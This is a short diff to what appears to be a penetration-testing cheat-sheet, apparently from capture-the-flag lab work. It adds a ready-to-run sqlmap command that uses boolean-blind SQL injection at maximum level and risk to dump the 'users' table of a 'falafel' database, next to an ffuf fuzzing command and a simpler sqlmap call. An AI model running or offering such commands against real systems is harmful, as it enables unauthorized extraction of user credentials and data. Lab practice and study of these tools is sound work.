@@ -235,7 +235,7 @@ ffuf -u http://10.10.10.93/transfer.aspx -w extensions.txt -request request.txt 
 # sqlmap
 ```shell
 sqlmap -r req.txt --current-user --batch
-
+sqlmap -r login.req --level=5 --risk=3 --string="Wrong identification" --technique=B -T users -D falafel --dump
 ```
 
 # Powershell
